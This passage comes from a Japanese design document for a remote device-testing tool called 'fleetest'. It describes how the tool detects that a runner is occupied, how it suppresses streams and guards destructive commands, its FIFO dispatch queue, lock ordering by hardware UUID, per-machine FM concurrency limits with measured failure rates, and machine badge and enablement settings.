あるのはランナーのディスクで、監視間隔ごとに ssh で覗きに行くと churn になる(§13 の
「表示フィルタは通さない = ssh の churn を作らない」と同じ規律)。**すでに向こうで走っている
子(fan-out の `api monitor`)にローカルのファイルを読ませ、既存の NDJSON に相乗りさせる**。

```
発行側                            ランナー機(<base>)
  api monitor(親)  ── ssh ──▶  api monitor --device-machine local(子)
      │ ▲ monitorLock                  │ 毎周期 ~/.fleetest/dispatch.lock/info.json を読む
      │ │ (親が machine を埋める)       │
      └─── monitorLock(machine 欄なし = 手元。自分の ~/.fleetest を同じように読む)
  拡張 ─┴─ 配信を畳む / 錠前を出す / 破壊的操作の確認に添える
```

- **手元も観測の対象**。dispatch.lock は機械に1本で、**リモートへのディスパッチもローカル run も
  同じ1本を取る**(§13)ので、「ランナー機の文脈か」を占有を配るかどうかの条件にしない ——
  条件にしていた頃は、手元の run 中にツールバーの手元の行に錠前が出ず、他人がこの Mac へ
  ディスパッチしても配信が畳まれなかった。**手元の綴りは `machine` 欄を出さないこと**
  (monitorRuns / monitorDevices と同じ。拡張は `runBoardModel.LOCAL_MACHINE_KEY` = 空文字へ写し、
  ホスト負荷グラフの手元の行と一致する)
- **`FT_RUNNER_BASE` は無い**(2026-09-21 に削除)。役割は2つあったが、**ロックの場所**は
  `~/.fleetest` 固定になり、**`StreamLease` の控えの置き場**も同じ区画へ移って、どちらも
  `<base>` に依存しなくなった。**書き手も読み手もその機械の上で走る**ので、自分の `$HOME` が
  そのまま正解(ssh で運ぶ必要が無い)。**`FT_ISSUER` は run / exec とも運び続ける**
  (子が「保持者は自分か」を判定するため)
- **判定は `FTRemote.HostOccupancy` の1箇所**(純粋関数 + 薄い読み込み)。
  **info が読めなくても held は保つ**(「情報が読めなくてもロックは尊重する」と同じ向き)/
  **保持者不明を自分扱いにしない**(破壊的操作の確認が黙る側へ倒れる)
- **中継する親が machine を埋める**(monitorDevices・monitorFrame と同じ規律)。
  **子が落ちたら `observed:false` を1行流す**。拡張は控えを**消さずに**「不明」へ落とす ——
  消すと「一度も聞いていない機械」(= 旧ランナー。配信してよい)と同じ形になり、**run の
  最中に子が落ちただけで配信が再開する**(2026-08-31 のレビューで発見)。不明の間は
  **配信を畳んだまま**にし、**保持者は名乗らない**(`isConfirmedHeld` を通した所だけが
  「〜の run が実行中」と言ってよい)。**`held:false`(空き)と混ぜない**: 不明を空きとして
  扱うと、破壊的操作の確認が「走っている run は無い」と誤って請け合う。
  控えの寿命は monitor プロセスと同じ(再起動で空へ戻し、子が出し直す)
- **配信の退避は保持者を問わない**。自分の run でも配信との干渉は同じ(docs/verification.md の
  実測: 8台に配信を張ったフル E2E で Android が実際に赤になった)。**ただし自分の run のぶんは
  利用者が選ぶ**(ユーザー決定 2026-09-17): 「デバイスモニター」タブの「ライブ更新」(既定 ON)が
  ON の間は、手元のデバイスの `inRun` と自分が保持する機械では配信を続ける。**他人の run と、観測できない
  機械は ON でも畳む**(`machineLockModel.streamFoldMachines`)。**手元も同じ規則を通る**
  (2026-09-21): 自分の run は `mine:true` なので ON では畳まず、**他人がこの Mac へディスパッチして
  保持している間だけ畳む**。3ケースは `machineLockModel.test.mjs` が等号で固定する。**OFF は run の有無を問わず全台の配信と
  画面の取り込み(suppressFrames)を止める**(マシンの負荷を下げる口 = ユーザー決定。パネルが隠れたときと同じ
  `deviceStream.setVisible(false)` の経路。観測は monitor が続ける)。タイルと拡大表示は最後の絵のまま、絵・名前・
  バッジの明度を下げる(`streamToggle.js`。「未起動」「ブリッジ未起動」等の状態の表示と、実行ログのレーン見出しのバッジは暗くしない)。**畳むのは配信だけで観測は
  続ける** —— タイルはポーリングのフレームで更新され続ける(CLAUDE.md「観測と配信を同じ
  ループに書かない」)
- **同じデバイスの二重配信も止める**(`FTCore.StreamLease`)。共有ランナーでは同じデバイスを2人が眺めうるが、
  配信は端末側の実コストなので人数ぶん重なる。**拒否しない**のが要点 —— 起こしてから断る形に
  すると、断られるたびに ssh を張り直す再試行ループになる。配信を張る側が控えを1つ置き、
  監視の子がそれを読んで `streamedByOther` として配り、拡張はそのデバイスを起こさないだけにする
  (相手がやめれば次のサイクルで自然に張られる)。生存判定は **pid だけ**(RunHookLease と同じ)。
  控えは execv した先では消せないので溜まる —— **`remote clean` の保持ポリシーが
  `~/.fleetest/streams` を掃く**(pid が一巡して他人の配信に見え続ける穴の上限)。
  **同じ Mac の別ウィンドウ(拡張ホストが2つ)は台帳でなくプロセスの実体で判定する**
  (`FTCore.LocalStreamHolder`): 拡張はヘルパーを直接起こすので控えを書く口が無く、代わりに
  ヘルパーの環境に所有の印 `FT_PARENT_PID` がある。監視が `ps -E` で同じデバイスのヘルパーを探し、
  **最も早く起動した1本**(同点は pid の小さいほう = 両ウィンドウが同じ答えを出す)の所有者が
  自分と違えば `streamedByOther`。後から開いたウィンドウのタイルはポーリング表示になり、
  先のウィンドウを閉じれば次のサイクルで張られる。**ランナー機の上でも同じ判定が走る**:
  印は `FT_PARENT_PID` ではなく `FT_STREAM_OWNER`(`FTCore.StreamOwner`。拡張ホストが
  `<hostname>:<pid>` を1回立て、環境の継承で子孫へ届き、`RemoteShell` の run / exec が ssh 越しに
  export する)。同じ利用者が2つのウィンドウから同じランナーのデバイスを眺める形(控えの発行者が同じで
  `StreamLease` では区別できない)もこれで止まる。**`FT_PARENT_PID` は ssh 越しに運ばない**
  (向こうで実在しない pid の死を検知して子が終わる)
- **破壊的操作**: `remote clean` は `RemoteDestructiveGuard` でロックを読んで中止する
  (`--ignore-lock` で押し切れる。**読めないときは通す** —— 掃除が永久にできなくなるほうが
  害が大きい)。拡張は一括停止・デバイス削除/作成の modal に保持者を添える
  (**占有が不明なら何も足さない** = 沈黙)。**ロックはディスパッチしか写さないので、デバイスを止める
  CLI 自身も run-lease と MCP の印(`mcp-<鍵>.lease`)を読む**(デバイスごとの停止は
  `DeviceBooter.deviceInUseRefusal` でそのデバイスだけ止めない / プロファイル無しの掃討 `devices down` は
  `sweepRefusal` で丸ごと断る。MCP のセッションは別の文言で名指しする)。lease はツールのルートに
  あるので、**ランナー機で直接打った run も写る**。`remote clean` の掃討は `--ignore-lock` を
  `--force` として運ぶ
- **`bridge down`(`--port` / `--all`)も同じ規律だが、判定材料が無いときの倒し方は逆**
  (`BridgeDownRefusal.unresponsiveButBoundRefusal`。2026-09-22)。走査(`BridgeDiscovery.scan`)に
  載らないポート(= `/status` が返らない)は従来「宛先が引けない → 通す」だったが、**「応答しない」を
  「死んでいる」と読まない**規律(docs/design.md の `BridgeDiscovery.isBound` と同じ)がここには
  効いていなかった ——
  駆動中の XCUITest ブリッジは操作の間 `/status` を返さない(quiescence 待ちでブロックする。操作の間の待ちは上限 6 秒に
  縮めてあるが、起動・前面化の中の待ちは数十秒になりうる)ので、
  走査漏れを無条件に「通す」へ倒すと**いちばん使用中のときだけ門が開く**という逆向きの穴になる。
  実地 2026-09-22 の対照: 走査に載ったポートへの `bridge down --port` は
  `refusing to stop: … is being driven by an MCP session (fleetest-mcp pid …)` で正しく拒否した一方、
  **同時刻に走査へ載らなかったポート(MCP が操作中)は一言も言わずに停止**し、そのセッションは
  以後 "no running bridge" しか返さなくなった(ブリッジを起動し直すまで回復しない)。
  今の形: 走査に載らないポートは `BridgeDiscovery.probeStatus` の**4値**で見て、断るのは
  **本当に busy(`.timedOut` = 上限まで応答を保持)のときだけ**(`--port`/`--all` の両経路。
  押し切るのは `--force` だけ。複数ポートは `probeStatuses` で並列に撃つ)。
  **「固まった転送」(`.transportFailed` = ブリッジが死んで iproxy だけがポートを握る)は断らない**
  —— 止めることが唯一の回復手段なのに「待て」と言い続ける袋小路になる(実地 2026-09-23。
  2026-09-22 の初版は `isBound` だけを見ていたのでここを busy と読んでいた。
  docs/maintainer-notes.md §44.1・§46.4)。待受も無ければ(`.notBound`)従来どおり通す
  (固まったブリッジを止める手段は奪わない)。**ループバックで即切れても、待受の実体が iproxy で
  なければ busy**(塞がったシミュレータのランナーは backlog が溢れて同じ指紋になる =
  `BridgeDiscovery.resolveTransportFailure`)。さらに**待受プロセスから udid が読めれば run / MCP の印を
  照合して断る**(`PortHolder.deviceUDID(fromListenerOn:)`。トンネルだけのポートは読まない =
  上の袋小路を作らない。maintainer-notes §49.2・§49.3)
- **順番待ちは GUI からも**: `api run --wait-lock`(`run` と対等になった。
  `RunCommandFlagParityTests` の run 専用表から外れた)+ 設定 `fleetest.remoteWaitLock`
  (M2 の時点では既定 0 = 待たない。**§18.9 で既定 3600 秒へ変えた** = FIFO の待機列が入り、
  待つことが順番の保証になったため)。**奪う口(`--force-lock`)は GUI に出さない** —— 走っているかもしれない
  他人の run を殺せる導線を作らない(§5 の決定を維持)
- **デバイスの lease(run-lease)の先読み拒否も `--wait-lock` を尊重する**(2026-09-22。
  `ProfileRunner.rejectIfLocalDevicesLeasedBeforeDispatch`。§13 の「dispatch.lock と run-lease の
  上下」で述べた先読みそのもの)。**この機械は1マシン1 run を保証している**ので、走っている run が
  終わればデバイスの lease は必ず空く(dispatch.lock と違って「待てば必ず解消する」)。以前は
  `--wait-lock 300` を渡しても1秒も待たずに `refusing to start: already in use by another
  fleetest run …` で落ち、連続実行の後発が dispatch.lock の FIFO の待機列にも並べなかった
  (実測 2026-09-22)。今は `LocalDeviceLeaseWaitPolicy.decide`(`WaitLockPolling` と同じ刻み)で
  待ってから再判定し、上限に達したら従来と同じ文言で断る
- **孤児 hooks はディスパッチ開始時に横断で代行**(`FTRemote.RemoteHooksReap`。1 ssh で
  `users/*/work` を回る)。**ロックを取った直後に撃つ**ので生きている run の
  hooks は触らない(加えて `hooks reap` 自身が pid の生死で判定する)。`remote clean` も
  同じコマンドを使う(2つ目の実装を作らない)
- **回収済みの録画はランナーから消す**(§15.4 の要件。**回収に成功したときだけ**)。
  実績 JSON は残す(保持ポリシーは `remote clean` の担当)。
  **ssh 越しのコマンドにグロブを書かない** —— 相手は zsh で、マッチしないグロブは
  `for` の語リストならシェルごと落とす(片付けの後続が全部消える)。一覧は `find` で作る
  → maintainer-notes §3.5 / 階層の数え間違いは §3.6
- **`remote status` に LOCK 欄**(1往復のプローブにブロックを1つ足すだけ。ホスト数ぶん往復を
  増やさない)。**旧ランナーは `-` = 判定不能**で、空きとは区別する

**この判定は「出れば占有」であって「出なければ空き」ではない**: dispatch.lock を取らない経路
(ランナー機で人が直に打った `fleetest run`)は写らない。

### 18.8 やらないと決めたもの(M2 の検討時。再提案しない)

- **版のピン留めを機械で強制する**(`pin.json` を置いて外れる align を拒否): §18.3 は
  「摩擦設計であってアクセス制御ではない」と決めており、同一信頼グループでは ssh で入れる人が
  誰でも align を打てる以上、強制は形だけになる。向き付きの案内(規則1)と当番(規則3)で足りる
- **帰属を ssh 鍵に束ねる**(`authorized_keys` の `environment="FT_ISSUER=…"`):
  自己申告でなくなり失効も行削除で済むが、`PermitUserEnvironment` の有効化がランナーの
  前提に増え、M0 の「発行側で解決して運ぶ」規律(§18.5 の 3)と衝突する。
  **同一信頼グループ前提(§15.3 (a))では帰属は調整のためのもので、認証ではない**

### 18.9 順番待ち(FIFO の待機列。実装済み: 2026-09-21)

M2 の `--wait-lock` は「10 秒ごとに `mkdir` を撃ち直す」だけなので、**待った順は保証されない**
(後から押した run が先に取れる・運が悪い人は待ち続ける)。dispatch.lock の**手前**に
FIFO の待機列を置いた。**ロックの原子性は `mkdir` のまま**で、待機列は「次に撃ってよいのは誰か」
だけを決める。

```
~/.fleetest/
├── dispatch.lock/                                ← 変わらず mkdir の原子性がロックの実体
└── dispatch.queue/<13桁epoch>~<issuer>~<group>   ← 待機チケット(ホスト共有)
```

- **1 往復で「並ぶ → 失効を掃く → 先頭なら取る」**(`FTRemote.RemoteDispatchQueue.
  enqueueAndTryAcquireCommand`)—— 順番を知るために ssh を1本も足さない(§18.7 と同じ規律)。
  **判定(位置・総数)は Swift 側**(`parseOutcome`)で、シェルは一覧と判定語を出すだけ
- **ファイル名の辞書順 = 待ち順**。13 桁ゼロ埋めの epoch ミリ(桁が揃わないと辞書順が時刻順に
  ならない)。issuer / group は `%XX` へ畳むので区切りの `~` は必ずエンコードされる
- **待たない取得もこの列を通る** —— 通さないと、並んでいる人を追い越せてしまい FIFO が成立しない。
  `--wait-lock` が無ければ「自分が先頭でなければ即失敗」になるだけで、従来と所要は変わらない
- **`--force-lock` だけが列を通らない**(奪う口。**GUI には出さない**の決定は維持)
- **チケットの鍵は発行側が1回だけ採り、全機械へ運ぶ**(`FT_DISPATCH_TICKET`)—— 機械ごとに
  採り直すと**同じ run の前後関係が機械によって食い違い**、互いに相手の機械を待つ形になる
- **失効は mtime の 30 秒**(= `WaitLockPolling.pollIntervalSeconds` × 3。撃ち直しがそのまま
  ハートビート)。**ここが唯一 mtime に頼る場所** —— `RemoteDispatchLockInfo.pid` が表示専用なのと
  同じ理由で、**発行側の pid はランナーから見えない**。**失効しても run は1本も殺さない**
  (待機列から落ちて順番を失うだけ。**ロック本体には時刻判定を一切入れない** = §5 の
  「既定では奪わない」は不変)
- **保持者が読めないときに「実行中」と言わない** —— 自分の番でないだけ(`.waiting`)のときは、
  控えが nil でもロックは空いていることがある(前の人もまだ待っている)。§18.7 の
  「不明と空きを混ぜない」の同型で、文言は「N 件が先に並んでいる」に分ける
- **拡張へは `dispatchWaiting`(NDJSON・ProtocolVersion 19)で位置と総数を配り、実行ログビューの
  全体レーンに出す**(**手元のロックの待機も同じイベント**で `machine: "local"`。§5 の限界 4)。
  ログとイベントは**同じ刻みの式を1つ**通す(数字が2箇所で食い違わない)。
  既定は 3600 秒待つ(`fleetest.remoteWaitLock`。**モニターの「設定」タブから変えられる** ——
  根拠: run 1 本の実測が 10 分前後なので、先客が数本並んでいても待ち切れる長さ)。
  **進捗(待機列の位置)に応じて期限を延ばす形は採らない**(期限が動くと仕様が分かりにくく挙動が
  読めない。ユーザー決定 2026-09-21・再提案しない)—— 足りなければ利用者がこの値を伸ばす

**待機列だけでは塞がらない窓**: 機械ごとに子が別々にロックを取りに行くので、チケットの鍵を run で
共通にしても**「置く」と「取る」の間**に相互待ちが作れる。**§18.10 の資源順序付けで無くした**
(自己解消はするが、既定 3600 秒では最悪 2 時間の待ちになるため予防へ切り替えた)。

### 18.10 資源順序付け(ハードウェア UUID 昇順。実装済み: 2026-09-21)

**全員が同じ順序でしか取らないなら、循環待ちは作れない**(デッドロックの4条件のうち循環待ちを
構造的に壊す)。検出も自己解消も要らない、根本的な解。

- **順序の鍵はランナーのハードウェア UUID**(`IOPlatformUUID`)。鍵の条件は「同じ機械なら誰が見ても
  同じ・違う機械なら必ず違う」。**IP**(1台に複数付き・経路で変わる)/ **ホスト名**(重複しうる・
  mDNS/DHCP で変わる = §18.6 の issuerId と同じ罠)/ **`<base>` 配下の ID**(§13 の理由で割れる)
  はどれも満たさない
- 採取は**接続の1往復に相乗り**(`RemoteProbe.hardwareUUIDCommand`)= **ssh を1本も足さない**。
  `ioreg | grep` を `echo "$(…)"` で包む(1件も拾えないと**行ごと消え** `$HOME` とコンソール
  ユーザーの判定まで道連れになる)。値は**大文字の正準形**へ(表記揺れで順序が割れない)
- キャッシュは `RemoteHostFacts.hardwareUUID`(`.fleetest/remote-hosts/<host>.json`)。
  **書き手は接続直後の `cacheHardwareUUID` の1箇所**(run の最後ではない = ロックも取れずに落ちた
  run でも控えが残る)。**前回と違う値なら1行言って更新する** —— 「この host は前回と別の Mac を
  指している」は DHCP のリース変更・機材入れ替えで実際に起きる。**run は止めない**
- **並べ替えは `FTRemote.DispatchOrder.sorted` の1箇所**(純粋関数)。UUID 昇順 → **不明は最後尾**
  (その中は host 昇順)→ tie-break まで下ろして**全順序**にする(Swift の sort は非安定なので、
  等しい要素が残ると「同じ入力集合なら同じ並び」が崩れる)。**不明を既定値で埋めない**が、
  **1台の不明で全体を諦めもしない**(引ける機械どうしの相対順は守られる)
- **順序を決める前に、キャッシュに無い機械だけ採る**(`DispatchPrelock.fillMissingUUIDs`。既存の
  `resolveLayout` → `cacheHardwareUUID` を通し、**2つ目の採取実装を作らない**)。**「不明なら対象外」は
  採れない** —— UUID を得るには接続が要るのに UUID が無いから接続しない、で初回が永久に詰む。
  規律3つ: **①キャッシュにある機械へは接続しない**(定常状態で往復ゼロ増)/ **②宛先が1つの run では
  採らない**(1台では循環が作れない)/ **③採れなくても止めない**(不明のまま最後尾)
- **不明が1台でも残る run は1行警告する**(`warnIfOrderUndetermined` = 「全順序に並べられないので
  相互待ちへの防御が無い」+ 機械名)。**鳴り続ける警告を作らない**規律の例外 —— 実害のある状態で、
  かつ**接続できれば次の run から黙る**
- **取るのは親(fan-out)が1台ずつ**(`DispatchPrelock`)。取り切ってから子を並列に起こし、
  子には**印**(`FT_DISPATCH_LOCK_HELD` = **その子の ssh 宛先**。真偽値にすると環境変数の継承で
  別の宛先へ向かう子まで取得を飛ばし、誰もロックを持たないまま走る)を渡して**取得と解放の両方を
  スキップ**させる。**片方だけ飛ばすと壊れる** —— 取得だけ飛ばせば子の defer が親のロックを消し、
  解放だけ飛ばせば子が親を待って詰む(`DispatchLockHandoffWiringTests` が門の集合を等号で固定)
- **印が無ければ子は従来どおり自分で取る** —— 単発 `run --runner`(親が居ない)は無改造で動く。
  モードを明示的に分岐させない
- **取れなかった機械は飛ばす** —— 要求は「各 run の取得順が全順序に従う」ことだけなので、
  **部分列でも一貫性は保たれる**。印を渡さないので失敗の文言も JUnit の扱いも従来のまま
- **子へ `--wait-lock` を渡さない** —— 待つのは親の役目になった。渡すと、親が上限まで待って
  取れなかった機械で**子がもう一度同じ上限を払う**(既定 3600 秒なら最悪 2 時間)
- **local を全順序の外へ出さない**(実装の途中で危うく壊れかけた)。「手元はビルド前の一時ロックで
  もう取ってあるから、`DispatchPrelock` では local だけ取り直しを飛ばす」という形
  (`preacquiredLocal` 相当)を入れかけたが、これは全順序の保証をそのまま壊す —— Mac X で
  複数機械 run(X + M1Max)を起こすと X を先取りして M1Max を UUID 順で待つ、のに対し**同時に**
  M1Max で複数機械 run(M1Max + X)を起こすと M1Max を先取りして X を待つ、で互いに待つ形が
  作れてしまう(`--wait-lock` 付きならどちらも上限まで待って共倒れになる)。`DispatchPrelock.live`
  の `acquire` クロージャのコメントが最初からこの形を警告していた(「手元だけ順序の外へ出すと、
  A が手元を握って M1Max を待ち、B が M1Max を握って手元を待つ形が作れる」)。守るのは2つ:
  **①ビルド直列化のための一時ロック(前項)は必ず解放してから `acquireInOrder` に入る**
  (local に配られたかどうかを見ずに無条件で解放する)/ **②local 分岐から取得を飛ばす return を
  足さない**(`DispatchPrelock.live` の `acquire` は local も他の機械と同じく毎回取得を試みる)。
  `Tests/FleetestTests/DispatchLockBeforeBuildOrderingTests.swift` がソース走査でこの2つを固定する
- **親が死んだときのロックは従来どおり回収される**: info.json の pid は**親の pid** になるので、
  既存の「自分の死んだディスパッチを次の run が自動回収する」(ランナー上でその run が生きていない
  ことの確認込み)がそのまま効く。親は取得の前に `InterruptRelay.observing` を張る(SIGINT で
  即死して `defer` の解放が飛ぶのを防ぐ)
- **この経路は緑の run では1度も実行されない**(競合が起きなければ順序も待ちも観測できない)。
  `DispatchPrelock.Actions` の差し替え口に偽のランナー群を注入して、**2つ目の run が列の先頭で待ち、
  1つ目の解放後に同じ順序で取り切る**ことを単体で通す。**陽性対照**として「順序付けが無い形では
  同じ2台で確定的にデッドロックする」テストを対にして置く(前者が「常に成功する仕掛け」でないことの witness)


## 19. 機械ごとの FM 並列枠(`fmConcurrency`。実装済み: 2026-09-02)

**機械によっては FM を 2 並列以上で呼ぶと壊れる。** 登録簿(`~/.config/fleetest/config.json` の
`RemoteHostEntry`)に `fmConcurrency` を置き、ディスパッチが `FT_FM_CONCURRENCY` として運ぶ
(`RemoteShell.remoteRunCommand`)。**設定が無ければ何も渡さない** —— ランナー側の既定
(`FMCallSlots.defaultConcurrency` = 1。壊れる機械を既定で守るためのユーザー決定。5 まで上げたときの
効き方は docs/performance-tuning.md §3.5)が効く。

```
fleetest remote machines add M1Ultra --host user@10.0.0.2 --fm-concurrency 1
fleetest remote machines add M1Ultra --host user@10.0.0.2 --clear-fm-concurrency   # 既定へ戻す
fleetest remote machines list                                                       # FM 列に出る
```

**`--fm-concurrency` を省略した add は既存の値を保つ**(upsert なので、指定なしを「消す」に
すると別件で add を打ち直した瞬間に設定が黙って消える)。消すのは `--clear-fm-concurrency` だけ。

### なぜ機械ごとに要るのか(2026-09-02 実測)

Mac Studio M1 Ultra(Mac13,2 / macOS 26A5425a)で、occlusion guard を有効にした同一8シナリオ
(E2E-CMP・リモート単独実行)を条件だけ変えて測った:

| 条件 | FM 呼び出し | 失敗 | 平均レイテンシ |
|---|---|---|---|
| 4レーン(枠5) | 68 | **18 (26.5%)** | 7.09s |
| 2レーン(枠5) | 71 | **22 (31.0%)** | 5.17s |
| 1レーン(枠5) | 76 | 0 | 3.34s |
| **4レーン + 枠1** | 68 | **0 (0.0%)** | 3.28s |

**レーン数ではなく FM の同時実行数が効く**。2レーンでも 31% 失敗するのに、4レーンのまま枠を1に
すると 0% になる。**メモリ量でもない** —— この機械はレーンあたり 32GB で、失敗 0 の M2 Ultra
(24GB/レーン)より潤沢。同じ macOS ビルドで **M2 Ultra は 2,383 回・失敗 0**。

真因は Apple 側の推論サービス `TGOnDeviceInferenceProviderService` が画像エンコーダ
(`AFMV11ImageEncoderRunner.withEncodedImage` → `V11E2EPipeline.runInternal(imageIn:gridH:gridW:)`)で
クラッシュすること。**Apple へ報告済み(FB23936145)**。詳細と証拠は
`reports/apple-feedback-fm-flap/REPORT-followup-20260902.md`。

**代償**: 枠を絞ると `FMCallSlots` の待ちが伸び、timeout(20秒)を超えた回は guard が素通りする。
上の実測でも skip が 6 件出た(絞る前は 13 件なので改善はしている)。**`fm.skipped` で必ず
確認すること**(docs/results-json.md)。

## 20. マシンのバッジ色(`color`)

モニターのマシン名バッジ(`.badge-remote`)の地色。登録簿の `RemoteHostEntry.color` に
**パレットの鍵**(`gray` / `rose` / …)で置く。**パレットと割り当て規則の唯一の定義元は
`FTCore.MachineBadgeColor`** —— 拡張は定数を持たず、`api remote-machines` の `machineColors` を写す。

- **決まるのは `RemoteHostRegistry.upsert` の1箇所**: 色を省略した upsert は既存の色を保つ /
  新規のマシンには**他のマシンの使用数が最も少ない色**(同数ならパレット順)を割り当てる。
  設定タブ・`remote machines add`・`remote setup` のどの経路で足しても同じ規則になる
- 色を選ぶ口は設定タブの「バッジ色」列のボタン(パレット)と `remote machines add --color <鍵>`。
  未知の鍵は拒否する(`--import` / `--color`)。ファイルに未知の鍵があれば未設定として読む
- 出力の `hosts[].color` は常にキーを出し、未設定は `""`。古い CLI(`machineColors` 欠落)では
  拡張は登録簿の取得ごと失敗にする(`unexpected output shape`。`remoteHostsController.ts`)
- マシン名を変えても色はついて行く(設定タブは改名を remove + import で送り、行の色を載せる)

## 21. マシン有効(`enabled`)

設定タブの「マシン有効」(バッジ色の右・既定 ON)。**off のマシンへは、どこへ配るかを
ツールが決める経路で配らない**。判定の唯一の定義元は `FTCore.MachineEnablement`。

- 保存形: 登録簿は `RemoteHostEntry.enabled`、この機械(固定行)は `LocalConfig.localMachineEnabled`。
  **false だけを保存する**(nil = 有効)。upsert は nil を「既存を保つ」と読む(色と同じ規律。
  `remote machines add` を打ち直しても消えない)。`api remote-machines` の出力は `hosts[].enabled` /
  `local.enabled` を常に出す。CLI は `remote machines add <name> --host … --enabled false`
- 効く経路: **`DeviceMachineRunner.plan`**(`run --profile` / `api run --profile` の機械分担・
  全台が1機械の自動ディスパッチ・`api remote-compat` の対象集合)と **`--fleet`**
  (`FleetRunner.excludingDisabledMachines`)。外した機械は stderr に1行出す
- **1台でも外したら、残りが1機械でも分割計画を返す** —— nil を返すと単一経路がプロファイルを
  丸ごと見て、外した機械へ自動ディスパッチする/手元でリモートのデバイスを探す。全部外れたら断る
- **明示の `--runner` には効かない**: 機械分担・フリートの子は `--runner <machine|local>` 付きで起こされ、
  ランナー機の上でも `--runner local` で走る。ここで断ると配った先で自分の run を止める
- 監視(`api monitor` の fan-out)・デバイス操作は止めない(配らないだけ)。dry-run は常に手元
- **無効にした機械のデバイスを自動で終了しない**(2026-09-20 に入れて同日撤去。ユーザー決定)——
  「マシン有効」は**発行者ごと**の設定なので、共有ランナーでは他人が温めてあるデバイス・供給の途中のデバイス・
  他人が眺めているデバイスを落とす(守れるのは run-lease と MCP の印だけ)。止めるのはタイルの停止・
  一括停止(保持者を添えた確認 + lease)だけ。**再提案するなら所有者台帳(誰が起こしたか)を
  先に置く** → maintainer-notes §39

## 関連

- CI 前提・FM の可否表: [ci.md](ci.md)
- 実行アーキテクチャ・AppDriver 境界: [design.md](design.md) §2
- 検証の規律(flake 判定・対照実験の作法): [verification.md](verification.md)
